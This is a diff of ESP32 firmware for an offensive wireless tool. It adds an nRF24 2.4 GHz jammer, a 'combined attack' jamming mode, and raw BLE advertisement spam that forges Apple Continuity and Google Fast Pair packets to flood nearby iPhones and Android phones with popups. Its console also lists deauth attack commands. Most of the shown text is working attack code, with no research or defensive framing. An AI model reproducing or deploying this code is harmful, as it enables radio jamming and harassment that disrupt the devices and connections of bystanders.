-    tft.print(" (");
-    tft.print(2400 + nrfChannel);
-    tft.println(" MHz)");
-    
-    y += 15;
-    tft.setCursor(SIDE_MARGIN + 5, y);
-    tft.setTextColor(COLOR_PURPLE);
-    tft.printf("  Packets: %d", nrf1Packets);
+  // Update hops per second
+  static unsigned long lastHopCount = 0;
+  static unsigned long lastHopTime = 0;
+  static uint32_t hopsPerSec = 0;
+  if (millis() - lastHopTime > 1000) {
+    hopsPerSec = nrfJamPackets - lastHopCount;
+    lastHopCount = nrfJamPackets;
+    lastHopTime = millis();
   }
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(leftColX + 55, statsY + 12);
+  tft.printf("(%d/s)", hopsPerSec);
   
-  // Radio 2 status
-  if (nrf2Available && dualNRFMode) {
-    y += 20;
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 5, y);
-    tft.print("Radio 2 Ch: ");
-    tft.setTextColor(COLOR_ACCENT);
-    tft.print(nrfChannel + 25);
-    tft.setTextColor(COLOR_TEXT);
-    tft.print(" (");
-    tft.print(2425 + nrfChannel);
-    tft.println(" MHz)");
-    
-    y += 15;
-    tft.setCursor(SIDE_MARGIN + 5, y);
-    tft.setTextColor(COLOR_PURPLE);
-    tft.printf("  Packets: %d", nrf2Packets);
+  // Update duration
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(rightColX, statsY + 12);
+  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
+  tft.printf("%-3d sec", runtime);
+  
+  // Update performance indicator
+  int perfY = statsY + 42;
+  tft.fillRect(leftColX + 5, perfY, 230, 12, COLOR_BG);
+  
+  if (hopsPerSec > 50000) {
+    tft.setTextColor(COLOR_GREEN);
+    tft.setCursor(leftColX + 5, perfY);
+    tft.print("EXCELLENT (50k+)");
+  } else if (hopsPerSec > 30000) {
+    tft.setTextColor(COLOR_GREEN);
+    tft.setCursor(leftColX + 5, perfY);
+    tft.print("VERY GOOD (30k+)");
+  } else if (hopsPerSec > 15000) {
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(leftColX + 5, perfY);
+    tft.print("GOOD (15k+)");
+  } else if (hopsPerSec > 5000) {
+    tft.setTextColor(COLOR_ORANGE);
+    tft.setCursor(leftColX + 5, perfY);
+    tft.print("FAIR (5k+)");
+  } else {
+    tft.setTextColor(COLOR_RED);
+    tft.setCursor(leftColX + 5, perfY);
+    tft.print("WEAK (<5k)");
   }
-  
-  y += 20;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Total: ");
-  tft.setTextColor(COLOR_WARNING);
-  tft.println(nrfJamPackets);
-  
-  y += 15;
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, y);
-  tft.print("Duration: ");
-  tft.setTextColor(COLOR_ACCENT);
-  tft.printf("%d sec", (millis() - lastNRFJamTime) / 1000);
 }
 
 // ==================== Combined Jammer ====================
 
 void startCombinedJammer() {
-  currentState = WIFI_BLE_NRF_JAM;
-  startBLEJammer();
+  Serial.println("\n========== COMBINED ATTACK MODE ==========");
+  Serial.println("[+] Starting nRF24 jammer (PRIMARY)...");
   startNRFJammer();
-  addToConsole("Combined jammer active");
+  delay(100);
+  
+  Serial.println("[+] Starting BLE spam (SECONDARY)...");
+  startBLEJammer();
+  
+  currentState = WIFI_BLE_NRF_JAM;
+  
+  addToConsole("COMBINED ATTACK ACTIVE");
+  Serial.println("[!] FULL SPECTRUM DISRUPTION");
+  Serial.println("    - nRF24: Jamming 2.4GHz (disconnects)");
+  Serial.println("    - BLE: Spamming discovery");
+  Serial.println("========================================\n");
+  
   displayCombinedJammer();
 }
 
 void stopCombinedJammer() {
-  stopBLEJammer();
+  Serial.println("\n[*] Stopping combined jammer...");
   stopNRFJammer();
+  stopBLEJammer();
+  
   currentState = BLE_MENU;
   drawBLEMenu();
 }
@@ -5254,112 +6426,274 @@ void displayCombinedJammer() {
 
 // ==================== BLE Spam Functions ====================
 
+void startAppleSpam() {
+  if (appleSpamActive) return;
+  
+  // ✅ FIX: Pause nRF24
+  bool wasNRFActive = nrfJammerActive;
+  if (nrfJammerActive) {
+    Serial.println("[*] Pausing nRF24 for Apple spam...");
+    nrfJammerActive = false;
+    delay(100);
+  }
+  
+  // Stop conflicting operations
+  if (bleJammerActive) stopBLEJammer();
+  if (androidSpamActive) stopAndroidSpam();
+  if (continuousBLEScan) {
+    continuousBLEScan = false;
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+    }
+  }
+  
+  // Clean init
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
+  // Initialize BLE
+  BLEDevice::init("iPhone");
+  delay(100);
+  
+  appleSpamActive = true;
+  appleSpamCount = 0;
+  lastAppleSpam = 0;
+  
+  Serial.println("[+] Apple BLE Spam started");
+  Serial.println("    Creates popup dialogs on nearby iPhones");
+  addToConsole("Apple spam: ACTIVE");
+}
+
+void stopAppleSpam() {
+  if (!appleSpamActive) return;
+  
+  appleSpamActive = false;
+  
+  esp_ble_gap_stop_advertising();
+  delay(100);
+  
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
+  Serial.printf("[+] Apple spam stopped (%d popups sent)\n", appleSpamCount);
+  addToConsole("Apple spam stopped");
+}
+
 void performAppleSpam() {
-  // BURST MODE: Multiple spam packets
-  for (int burst = 0; burst < 3; burst++) {
-    static uint8_t appleCounter = 0;
+  if (!appleSpamActive) return;
+  
+  // Slower cycle: 100ms minimum (prevents crash)
+  if (millis() - lastAppleSpam < 100) return;
+  lastAppleSpam = millis();
+  
+  // Feed watchdog
+  esp_task_wdt_reset();
+  
+  // Build full advertisement packet
+  uint8_t adv_data[31];
+  uint8_t adv_len = 0;
+  
+  // BLE Flags
+  adv_data[adv_len++] = 0x02;  // Length
+  adv_data[adv_len++] = 0x01;  // Type: Flags
+  adv_data[adv_len++] = 0x06;  // LE General Discoverable + BR/EDR Not Supported
+  
+  // Manufacturer Specific Data
+  adv_data[adv_len++] = 0x1B;  // Length (27 bytes for Continuity)
+  adv_data[adv_len++] = 0xFF;  // Type: Manufacturer Specific
+  adv_data[adv_len++] = 0x4C;  // Company ID: Apple (0x004C)
+  adv_data[adv_len++] = 0x00;
+  
+  // Choose random message type
+  static uint8_t msgType = 0;
+  msgType = (msgType + 1) % 3;
+  
+  if (msgType == 0) {
+    // Proximity Pairing (AirPods/Beats/AirTag)
+    uint16_t model = apple_models[random(0, 10)];
     
-    BLEAdvertisementData advertisementData;
+    adv_data[adv_len++] = 0x07;  // Type: Proximity Pairing
+    adv_data[adv_len++] = 0x19;  // Length: 25
+    adv_data[adv_len++] = 0x01;  // Flags
+    adv_data[adv_len++] = (model >> 8) & 0xFF;  // Model high byte
+    adv_data[adv_len++] = model & 0xFF;         // Model low byte
+    adv_data[adv_len++] = 0x00;  // Status
     
-    // Rotate through different Apple devices rapidly
-    switch (appleCounter % 10) {
-      case 0:
-        advertisementData.setName("AirPods Pro");
-        break;
-      case 1:
-        advertisementData.setName("AirPods Max");
-        break;
-      case 2:
-        advertisementData.setName("AirPods Gen 3");
-        break;
-      case 3:
-        advertisementData.setName("iPhone 15 Pro");
-        break;
-      case 4:
-        advertisementData.setName("Apple Watch Ultra");
-        break;
-      case 5:
-        advertisementData.setName("AirTag");
-        break;
-      case 6:
-        advertisementData.setName("MacBook Pro");
-        break;
-      case 7:
-        advertisementData.setName("iPad Pro");
-        break;
-      case 8:
-        advertisementData.setName("Beats Studio");
-        break;
-      case 9:
-        advertisementData.setName("HomePod");
-        break;
+    // Random MAC address
+    for (int i = 0; i < 6; i++) {
+      adv_data[adv_len++] = random(0, 256);
     }
     
-    // Random manufacturer data for more chaos
-    uint8_t appleData[] = {0x4C, 0x00, 0x12, 0x02, random(0, 256), random(0, 256)};
-    advertisementData.setManufacturerData(std::string((char*)appleData, 6));
+    adv_data[adv_len++] = 0x00;  // Hint
     
-    pAdvertising->setAdvertisementData(advertisementData);
-    pAdvertising->start();
-    delayMicroseconds(100);
-    pAdvertising->stop();
+    // Reserved
+    for (int i = 0; i < 8; i++) {
+      adv_data[adv_len++] = 0x00;
+    }
     
-    appleCounter++;
+    // Battery levels
+    for (int i = 0; i < 3; i++) {
+      adv_data[adv_len++] = random(0, 101);  // 0-100%
+    }
+    
+  } else if (msgType == 1) {
+    // Nearby Action (AppleTV/AirDrop)
+    uint8_t action = apple_actions[random(0, 9)];
+    
+    adv_data[adv_len++] = 0x0F;  // Type: Nearby Action
+    adv_data[adv_len++] = 0x05;  // Length: 5
+    adv_data[adv_len++] = 0x00;  // Flags
+    adv_data[adv_len++] = action;  // Action type
+    
+    // Auth tag (random)
+    for (int i = 0; i < 3; i++) {
+      adv_data[adv_len++] = random(0, 256);
+    }
+    
+  } else {
+    // AirDrop
+    adv_data[adv_len++] = 0x05;  // Type: AirDrop
+    adv_data[adv_len++] = 0x12;  // Length: 18
+    adv_data[adv_len++] = 0x00;  // Flags
+    
+    // Zero hash
+    for (int i = 0; i < 8; i++) {
+      adv_data[adv_len++] = 0x00;
+    }
+    
+    // Random data
+    for (int i = 0; i < 9; i++) {
+      adv_data[adv_len++] = random(0, 256);
+    }
   }
+  
+  // Send raw advertisement
+  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
+  esp_ble_gap_start_advertising(nullptr);
+  
+  appleSpamCount++;
+  
+  // Stop after 50ms
+  delay(50);
+  esp_ble_gap_stop_advertising();
+  
+  yield();
+}
+
+void startAndroidSpam() {
+  if (androidSpamActive) return;
+  
+  // ✅ FIX: Pause nRF24
+  bool wasNRFActive = nrfJammerActive;
+  if (nrfJammerActive) {
+    Serial.println("[*] Pausing nRF24 for Android spam...");
+    nrfJammerActive = false;
+    delay(100);
+  }
+  
+  // Stop conflicting operations
+  if (bleJammerActive) stopBLEJammer();
+  if (appleSpamActive) stopAppleSpam();
+  if (continuousBLEScan) {
+    continuousBLEScan = false;
+    if (pBLEScan != nullptr) {
+      pBLEScan->stop();
+    }
+  }
+  
+  // Clean init
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
+  // Initialize BLE
+  BLEDevice::init("Pixel Buds");
+  delay(100);
+  
+  androidSpamActive = true;
+  androidSpamCount = 0;
+  lastAndroidSpam = 0;
+  
+  Serial.println("[+] Android BLE Spam started");
+  Serial.println("    Creates Fast Pair popups on nearby Android phones");
+  addToConsole("Android spam: ACTIVE");
+}
+
+void stopAndroidSpam() {
+  if (!androidSpamActive) return;
+  
+  androidSpamActive = false;
+  
+  esp_ble_gap_stop_advertising();
+  delay(100);
+  
+  if (BLEDevice::getInitialized()) {
+    BLEDevice::deinit(true);
+    delay(200);
+  }
+  
+  Serial.printf("[+] Android spam stopped (%d popups sent)\n", androidSpamCount);
+  addToConsole("Android spam stopped");
 }
 
 void performAndroidSpam() {
-  // BURST MODE: Multiple spam packets
-  for (int burst = 0; burst < 3; burst++) {
-    static uint8_t androidCounter = 0;
-    
-    BLEAdvertisementData advertisementData;
-    
-    // Rotate through Android devices rapidly
-    switch (androidCounter % 10) {
-      case 0:
-        advertisementData.setName("Galaxy Buds Pro");
-        break;
-      case 1:
-        advertisementData.setName("Pixel Buds Pro");
-        break;
-      case 2:
-        advertisementData.setName("Galaxy Watch 6");
-        break;
-      case 3:
-        advertisementData.setName("OnePlus Buds Pro");
-        break;
-      case 4:
-        advertisementData.setName("Xiaomi Buds 4");
-        break;
-      case 5:
-        advertisementData.setName("Nothing Ear");
-        break;
-      case 6:
-        advertisementData.setName("Sony WF-1000XM5");
-        break;
-      case 7:
-        advertisementData.setName("Pixel 8 Pro");
-        break;
-      case 8:
-        advertisementData.setName("Galaxy S24");
-        break;
-      case 9:
-        advertisementData.setName("Redmi Buds");
-        break;
-    }
-    
-    // Fast Play manufacturer data
-    uint8_t androidData[] = {0xE0, 0x00, random(0, 256), random(0, 256)};
-    advertisementData.setManufacturerData(std::string((char*)androidData, 4));
-    
-    pAdvertising->setAdvertisementData(advertisementData);
-    pAdvertising->start();
-    delayMicroseconds(100);
-    pAdvertising->stop();
-    
-    androidCounter++;
-  }
+  if (!androidSpamActive) return;
+  
+  // Slower cycle: 100ms minimum
+  if (millis() - lastAndroidSpam < 100) return;
+  lastAndroidSpam = millis();
+  
+  // Feed watchdog
+  esp_task_wdt_reset();
+  
+  // Build Fast Pair advertisement
+  uint8_t adv_data[31];
+  uint8_t adv_len = 0;
+  
+  // BLE Flags
+  adv_data[adv_len++] = 0x02;
+  adv_data[adv_len++] = 0x01;
+  adv_data[adv_len++] = 0x06;
+  
+  // Service UUID (Fast Pair)
+  adv_data[adv_len++] = 0x03;  // Length
+  adv_data[adv_len++] = 0x03;  // Type: Complete List of 16-bit UUIDs
+  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID: 0xFE2C
+  adv_data[adv_len++] = 0xFE;
+  
+  // Service Data (Fast Pair)
+  adv_data[adv_len++] = 0x06;  // Length
+  adv_data[adv_len++] = 0x16;  // Type: Service Data
+  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID
+  adv_data[adv_len++] = 0xFE;
+  
+  // Model ID (3 bytes)
+  uint32_t model = android_models[random(0, 13)];
+  adv_data[adv_len++] = (model >> 16) & 0xFF;
+  adv_data[adv_len++] = (model >> 8) & 0xFF;
+  adv_data[adv_len++] = model & 0xFF;
+  
+  // TX Power (optional but helps)
+  adv_data[adv_len++] = 0x02;
+  adv_data[adv_len++] = 0x0A;  // Type: TX Power
+  adv_data[adv_len++] = 0x00;  // 0 dBm
+  
+  // Send raw advertisement
+  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
+  esp_ble_gap_start_advertising(nullptr);
+  
+  androidSpamCount++;
+  
+  // Stop after 50ms
+  delay(50);
+  esp_ble_gap_stop_advertising();
+  
+  yield();
 }
 
 // ==================== AirTag Scanner ====================
@@ -5588,8 +6922,18 @@ void startWardriving() {
 void displayWardrivingResults() {
   tft.fillScreen(COLOR_BG);
   drawTerminalHeader("wardriving");
+  esp_task_wdt_reset();
+
+  // Heap monitoring
+  static unsigned long lastHeapCheck = 0;
+  if (millis() - lastHeapCheck > 10000) {
+    if (ESP.getFreeHeap() < 20000) {
+      addToConsole("WARN: Low memory!");
+      Serial.printf("⚠️  Free heap: %d bytes\n", ESP.getFreeHeap());
+    }
+    lastHeapCheck = millis();
+  }
   
-  // ✅ FIXED: Moved blink to loop-level static
   static unsigned long lastBlink = 0;
   static bool blink = false;
   if (millis() - lastBlink > 500) {
@@ -5711,6 +7055,7 @@ void handleSerialCommands() {
       Serial.println("\n=== P4WNC4K3 Console ===");
       Serial.println("scan - Scan WiFi networks");
       Serial.println("deauth - Toggle deauth attack");
+      Serial.println("deauthsniff - Toggle deauth sniffer");
       Serial.println("sniffer - Toggle packet sniffer");
       Serial.println("ble - Scan BLE devices");
       Serial.println("blejam - Toggle BLE jammer");
@@ -5723,7 +7068,6 @@ void handleSerialCommands() {
       Serial.println("status - Show system status");
       Serial.println("console - Show console on screen");
       Serial.println("clear - Clear console buffer");
-      Serial.println("upload - Upload boot.gif via serial");  // ADDED
       Serial.println("info - System information");
     }
     else if (cmd == "scan") {
@@ -5743,6 +7087,14 @@ void handleSerialCommands() {
     }
     else if (cmd == "nrfjam") {
       toggleNRFJammer();
+    }
+    else if (cmd == "deauthsniff") {
+      if (!deauthSnifferActive) {
+        currentState = DEAUTH_SNIFFER;
+        startDeauthSniffer();
+      } else {
+        stopDeauthSniffer();
+      }
     }
     else if (cmd == "airtag") {
       startAirTagScanner();
